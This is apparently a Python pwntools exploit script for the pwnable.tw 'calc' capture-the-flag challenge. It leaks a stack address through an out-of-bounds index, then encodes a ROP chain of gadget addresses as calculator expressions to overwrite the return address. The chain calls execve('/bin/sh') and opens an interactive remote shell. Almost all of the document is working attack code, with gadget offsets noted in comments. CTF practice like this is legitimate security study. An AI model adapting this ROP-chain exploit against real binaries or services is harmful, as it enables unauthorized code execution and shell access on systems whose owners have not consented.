

from pwn import *
import pdb
import ctypes


context.log_level = "info"

p = remote('chall.pwnable.tw', 10100)
# p = process('/home/len/pwnable/calc')


def sendLine(msg):
    p.sendline(msg)

def recvLine():
    return p.recvline()

def debug_print(name, msg):
    print('{}: {:#x}'.format(name, ctypes.c_uint(int(msg)).value))
    

if __name__ == "__main__":
    recvLine()

    payload = '+360'
    sendLine(payload)
    ebp_addr = recvLine()
    debug_print('ebp_addr', ebp_addr)


    # log
    # 0x0805c34b : pop eax ; ret
    # 0x080481d1 : pop ebx ; ret (depri)
    # 0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret (failed)
    # 0x080701d1 : pop ecx ; pop ebx ; ret
    # 0x080701aa : pop edx ; ret
    # 0x08049a21 : int 0x80

    # stack
    # 0x0805c34b (ret) stk_addr
    # 0xb (offset: 4)
    # 0x080701aa (ret) offset: 0x8
    # # NULL offset:0xc
    # 0x080701d1 (ret) offset: 0x10
    # ecx offset: 0x14 
    # ebx    offset: 0x18
    # q (ret) offset: 0x1c
    # 0x08049499 (ret) offset: 0x20
    # 1852400175 offset: 0x24
    # 6845231 offset: 0x28
    # _sh_addr offset: 0x2c
    # 0xa offset: 0x30

    stk_addr = ctypes.c_uint(int(ebp_addr)).value - 0x20 + 0x4

    debug_print('stk_addr', stk_addr)

    
    payload = '+360'
    payload += '+1*{}'.format(0x0805c34b)
    payload += '+1*{}'.format(0xb)

    payload += '+1*{}'.format(0x080701aa)
    # edx
    payload += '+1*1{}'.format('*2'*0x32)

    payload += '+1*{}'.format(0x080701d1)
    # ecx
    payload += '+2*{}'.format((stk_addr + 0x2c)/2)
    # ebx
    payload += '+2*{}'.format((stk_addr + 0x24)/2)

    # int 0x80
    payload += '+1*{}'.format(0x0807087F)
    payload += '+1*{}'.format(0x08049499)

    # /bin/sh
    payload += '+1*{}'.format(1852400175)
    payload += '+1*{}'.format(6845231)

    # \n
    payload += '+2*{}'.format((stk_addr + 0x24)/2)
    # payload += '+1*{}'.format(0xa)
    
    payload += '+1*1{}+0'.format('*2'*0x32)


    # print(payload)
    # pdb.set_trace()

    sendLine(payload)
    cont = recvLine()

    # debug_print('ret_addr',cont)

    sendLine("")
    sendLine("")

    p.interactive()
    